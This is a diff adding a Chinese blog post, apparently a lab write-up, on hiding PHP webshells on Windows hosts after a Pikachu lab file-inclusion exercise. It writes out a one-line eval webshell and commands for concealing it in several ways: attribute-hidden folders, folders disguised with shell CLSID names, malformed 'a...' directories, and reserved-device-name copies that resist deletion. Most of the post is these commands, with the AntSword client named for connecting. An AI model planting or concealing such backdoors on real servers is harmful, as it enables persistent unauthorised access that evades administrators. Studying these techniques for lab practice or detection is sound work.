@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Windows主机下隐藏木马 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="接上文（Pikachu：远程文件包含写入木马）在目录下创建了shell.php后
+隐藏文件夹隐藏Webshell打开蚁剑终端
+mkdir tmp #创建隐藏文件夹,此时尚未隐藏
+cd tmp #进入,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Windows主机下隐藏木马</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Windows主机下隐藏木马</h1>
+        <div class="stuff">
+            <span>一月 03, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>接上文（<a href="https://lxh3ng.github.io/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/">Pikachu：远程文件包含写入木马</a>）在目录下创建了shell.php后</p>
+<h2 id="隐藏文件夹隐藏Webshell"><a href="#隐藏文件夹隐藏Webshell" class="headerlink" title="隐藏文件夹隐藏Webshell"></a>隐藏文件夹隐藏Webshell</h2><p>打开蚁剑终端</p>
+<pre class=" language-shell"><code class="language-shell">mkdir tmp #创建隐藏文件夹,此时尚未隐藏
+cd tmp #进入创建的文件夹
+echo ^<?php @eval($_POST["shell"]);?^> >>shell.php#写入Webshell至tmp目录下
+cd ../ #返回上一级目录
+attrib +s +a +h +r tmp #对创建的文件夹进行隐藏</code></pre>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/1.png" alt="img"></p>
+<p>我打开了显示隐藏文件，还是看不到的</p>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/2.png" alt="2"></p>
+<p>新的路径蚁剑可以连接：</p>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/3.png" alt="3"></p>
+<p>win11打开显示隐藏查看不到，但是可以通过路径直接访问</p>
+<h2 id="利用系统代号隐藏Webshell"><a href="#利用系统代号隐藏Webshell" class="headerlink" title="利用系统代号隐藏Webshell"></a>利用系统代号隐藏Webshell</h2><p>特殊文件名的代号</p>
+<pre class=" language-windows"><code class="language-windows">我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
+回收站.{645ff040-5081-101b-9f08-00aa002f954e}
+拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}
+打印机.{2227a280-3aea-1069-a2de-08002b30309d}
+控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}
+网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}</code></pre>
+<p>新建文件夹命名<code>我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code>会变成我的电脑</p>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/4.png" alt="4"></p>
+<p>通过拼接文件夹名,使用中国蚁剑进行木马连接,例如</p>
+<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//。。。。。。。/Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell.php</code></pre>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/5.png" alt="5"></p>
+<h2 id="畸形目录隐藏Webshell"><a href="#畸形目录隐藏Webshell" class="headerlink" title="畸形目录隐藏Webshell"></a>畸形目录隐藏Webshell</h2><p>创建畸形目录</p>
+<pre class=" language-shell"><code class="language-shell">mkdir a...\</code></pre>
+<p>Copy命令将木马移动到畸形目录下</p>
+<pre class=" language-shell"><code class="language-shell">copy b.asp</code></pre>
+<p>删除方法：</p>
+<pre class=" language-shell"><code class="language-shell">rd /s /q a...\</code></pre>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/6.png" alt="6"></p>
+<h2 id="利用系统保留名制作不死Webshell"><a href="#利用系统保留名制作不死Webshell" class="headerlink" title="利用系统保留名制作不死Webshell"></a>利用系统保留名制作不死Webshell</h2><p>在Windows操作系统中,是不能以下形式创建文件的,比如aux,com1,com2,prn,con,nul等.但是在cmd目录下可以通过copy语句创建,这类文件无法在图形化界面被删除,只能在命令行中被删除. 创建不死Webshell命令如下:</p>
+<pre class=" language-shell"><code class="language-shell">copy shell.php \\.\D:\phpStudy\PHPTutorial\WWW\pikachu\vul\fileinclude\1.php</code></pre>
+<p>我的win11没有复现成功</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY3MzcwMQ==&amp;mid=2247484784&amp;idx=3&amp;sn=8fc983d40d91b7a9a7eb709e65c944cd&amp;chksm=cf116f3af866e62c90285b409378aabfc55d708ea0606b9c81630e52cb1ca4c059027849907d&amp;mpshare=1&amp;scene=23&amp;srcid=0103GMx84FrUrfZnWKJpp0Jl&amp;sharer_sharetime=1641200593711&amp;sharer_shareid=992c19d88a5a27647ec75d14d60782cb#rd">Th0r：Windows下木马隐藏小技巧</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E9%9A%90%E8%97%8FWebshell"><span class="toc-number">1.</span> <span class="toc-text">隐藏文件夹隐藏Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E4%BB%A3%E5%8F%B7%E9%9A%90%E8%97%8FWebshell"><span class="toc-number">2.</span> <span class="toc-text">利用系统代号隐藏Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%95%B8%E5%BD%A2%E7%9B%AE%E5%BD%95%E9%9A%90%E8%97%8FWebshell"><span class="toc-number">3.</span> <span class="toc-text">畸形目录隐藏Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E4%BF%9D%E7%95%99%E5%90%8D%E5%88%B6%E4%BD%9C%E4%B8%8D%E6%AD%BBWebshell"><span class="toc-number">4.</span> <span class="toc-text">利用系统保留名制作不死Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">参考：</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
